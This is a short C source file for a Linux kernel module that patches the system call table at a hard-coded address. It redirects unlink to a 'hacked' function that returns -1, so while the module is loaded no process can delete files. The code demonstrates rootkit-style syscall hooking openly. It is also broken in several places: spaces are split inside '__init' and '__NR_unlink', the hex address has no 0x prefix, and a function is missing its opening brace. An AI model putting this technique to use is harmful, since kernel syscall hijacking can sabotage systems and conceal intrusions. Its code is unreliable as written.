#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

        
MODULE_LICENSE ("GPL");
        
unsigned long *sys_call_table;
        
asmlinkage long (*original_sys_unlink) (const char *pathname);

/*return -1. this will prevent any process from unlinking any file*/
asmlinkage long hacked_sys_unlink(const char *pathname)
{
        return -1;
}
        
static int _ _init my_init (void)
{
        /*obtain sys_call_table from hardcoded value
        we found in System.map*/
      //*(long *)&sys_call_table=0xc044fd00;
        *(long *)&sys_call_table=9b29c060;
        
        /*store original location of sys_unlink. Alter sys_call_table
        to point _ _NR_unlink to our hacked_sys_unlink*/
        original_sys_unlink =(void * )xchg(&sys_call_table[_ _NR_unlink],
hacked_sys_unlink);
        
        return 0;
}

static void my_exit (void)
/*restore original sys_unlink in sys_call_table*/
        xchg(&sys_call_table[_ _NR_unlink], original_sys_unlink);

}       

module_init(my_init);
module_exit(my_exit);